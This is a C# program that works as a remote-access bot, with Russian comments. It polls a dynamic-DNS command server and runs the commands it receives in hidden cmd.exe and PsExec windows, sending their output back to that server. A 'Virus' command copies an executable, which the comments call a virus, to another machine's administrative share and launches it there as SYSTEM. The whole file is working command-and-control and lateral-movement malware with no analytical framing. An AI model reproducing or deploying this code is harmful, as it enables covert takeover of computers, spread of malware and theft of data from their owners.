using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Nviemy1._24._2
{
    class Program
    {
        static string DNS_API_NAME = "http://wrongdoor.ddns.net";
        static async Task Main(string[] args)
        {
            Receive();
        }

        public static void Receive()
        {
            while (true)
            {
                try
                {
                    WebRequest request = WebRequest.Create(DNS_API_NAME + "/api/get/");
                    request.Method = "POST";
                    byte[] byteArray = new byte[2048];
                    request.ContentLength = byteArray.Length;
                    Stream dataStream = request.GetRequestStream();
                    dataStream.Write(byteArray, 0, byteArray.Length);
                    dataStream.Close();
                    WebResponse response = request.GetResponse();
                    List<Command> result;
                    using (dataStream = response.GetResponseStream())
                    {
                        // Open the stream using a StreamReader for easy access.  
                        StreamReader reader = new StreamReader(dataStream);
                        // Read the content.  
                        string responseFromServer = reader.ReadToEnd();
                        // Display the content.  
                        result = JsonConvert.DeserializeObject<List<Command>>(responseFromServer);

                        response.Close();
                    }
                    foreach (Command com in result)
                    {
                        Console.WriteLine(com);
                        if(com.type == Command.Type.CMD)
                        {
                            Thread newThread = new Thread(ExecuteCMD);
                            newThread.Start(com.body);
                        }
                        else if(com.type == Command.Type.PsExec)
                        {
                            Thread newThread = new Thread(ExecutePsExec);
                            newThread.Start(com.body);
                        }
                        else if (com.type == Command.Type.Virus)
                        {
                            Thread newThread = new Thread(CopyVirusTo);
                            newThread.Start(com.body);
                        }

                    }
                    Thread.Sleep(5000);
                }
                catch (Exception e)
                {
                    Thread.Sleep(10000);
                    Console.WriteLine(e.Message);
                }

            }
        }

        class Command
        {
            public string body;
            public Type type;

            public enum Type
            {
                CMD = 1,
                PsExec = 2,
                PsLoggedOn = 3,
                Virus = 4,
            }
        }


        /// <summary>
        /// Выполняет CMD команду
        /// </summary>
        /// <param name="command">CMD команда</param>
        public static void ExecuteCMD(object command)
        {
            string outp;
            ProcessStartInfo psiOpt = new ProcessStartInfo(@"cmd.exe", @"/C " + command.ToString()) ;
            // скрываем окно запущенного процесса
            psiOpt.WindowStyle = ProcessWindowStyle.Hidden;
            psiOpt.RedirectStandardOutput = true;
            psiOpt.RedirectStandardError = true;
            psiOpt.UseShellExecute = false;
            psiOpt.CreateNoWindow = true;
            // запускаем процесс
            Process procCommand = Process.Start(psiOpt);
            // получаем ответ запущенного процесса
            // выводим результат
            outp = procCommand.StandardError.ReadToEnd();
            outp = outp + procCommand.StandardOutput.ReadToEnd();
            // закрываем процесс
            procCommand.WaitForExit();
            WebClient webClient = new WebClient();
            webClient.QueryString.Add("com", outp);
            webClient.QueryString.Add("uniqueid", "server");
            string result = webClient.DownloadString(DNS_API_NAME + "/api/add/");
        }


        /// <summary>
        /// Выполняет psexec команду
        /// </summary>
        /// <param name="command">Psexec команда</param>
        public static void ExecutePsExec(object command)
        {
            string outp;
            ProcessStartInfo psiOpt = new ProcessStartInfo(@"C:\NVIDIA\PsTools\PsExec.exe", "-accepteula -accepteula " + command.ToString());
            // скрываем окно запущенного процесса
            psiOpt.WindowStyle = ProcessWindowStyle.Hidden;
            psiOpt.RedirectStandardOutput = true;
            psiOpt.RedirectStandardError = true;
            psiOpt.UseShellExecute = false;
            psiOpt.CreateNoWindow = true;
            // запускаем процесс
            Process procCommand = Process.Start(psiOpt);
            // получаем ответ запущенного процесса
            // выводим результат
            outp = procCommand.StandardError.ReadToEnd();
            outp = outp + procCommand.StandardOutput.ReadToEnd();
            // закрываем процесс
            procCommand.WaitForExit();
            WebClient webClient = new WebClient();
            // qfqwqqf
            webClient.QueryString.Add("com", outp);
            webClient.QueryString.Add("uniqueid", "server");
            string result = webClient.DownloadString(DNS_API_NAME + "/api/add/");
        }

        /// <summary>
        /// Копирует и вызывает вмрус на удаленном компьютере
        /// </summary>
        /// <param name="command">имя компутера</param>
        public static void CopyVirusTo(object command)
        {
            string cmd = command as string;
            string outp = $"\nКомпутер :: {cmd}\n";

            Ping ping = new Ping();
            PingReply pingReply = ping.Send(cmd,1000);
            

            if (pingReply.Status == IPStatus.Success)
            {
                //Убийство процесса
                try{
                    new Thread(ExecuteCMD).Start($"taskkill /s {cmd} /pid succ.exe");
                    Thread.Sleep(2000);
                    outp += "Процесс убит\n";
                }catch { }
                //Копирование
                try{
                    File.Copy(@"C:\NVIDIA\vi.exe", @"\\" + cmd + @"\c$\stud\succ.exe", true);
                    Thread.Sleep(2000);
                    outp += "EXE копирован\n";
                }catch(Exception e) { outp += $"\n---{e.Message}---\n"; }
                //Запуск 
                try{
                    new Thread(ExecutePsExec).Start(@" -d -i -s \\" + command.ToString() + @" 'C:\stud\succ.exe'");
                    outp += "Процесс запушен\n";
                }catch { }
            }
            else
            {
                outp += "Компутер ОФФЛАЙН или НЕ ДОСТУПЕН!!";
            }
            sendOutp(outp);
        }

        public static void sendOutp(string outp)
        {
            WebClient webClient = new WebClient();
            webClient.QueryString.Add("com", outp);
            webClient.QueryString.Add("uniqueid", "server");
            string result = webClient.DownloadString(DNS_API_NAME + "/api/add/");
        }
    }
}
